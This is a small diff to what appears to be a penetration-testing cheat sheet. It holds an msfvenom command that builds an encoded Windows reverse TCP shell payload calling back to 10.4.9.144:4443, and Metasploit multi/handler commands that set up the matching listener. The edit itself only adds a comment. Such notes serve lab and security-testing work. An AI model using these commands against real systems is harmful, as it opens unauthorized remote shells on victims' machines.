@@ -466,7 +466,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=4443 -e x86/shikata
 in meterpreter setup reverse windows tcp listener
 ```
 use exploit/multi/handler
-set payload windows/shell/reverse_tcp
+set payload windows/shell/reverse_tcp #windows/meterpreter/reverse_tcp
 set lhost 10.4.9.144
 set lport 4443
 run -j
